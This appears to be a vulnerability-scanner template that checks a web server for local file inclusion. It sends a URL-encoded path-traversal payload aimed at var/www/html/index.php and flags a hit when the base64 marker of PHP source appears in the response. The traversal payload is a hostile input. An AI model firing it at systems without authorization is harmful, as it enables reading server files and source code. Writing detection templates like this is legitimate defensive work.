id: lfi3-114
name: 'Traversal to system file via include'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via include'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      include:
        - '..%2f..%2f..%2fvar%2fwww%2fhtml%2findex.php'
    matchers:
      - type: word
        part: body
        words:
          - 'PD9waHA'
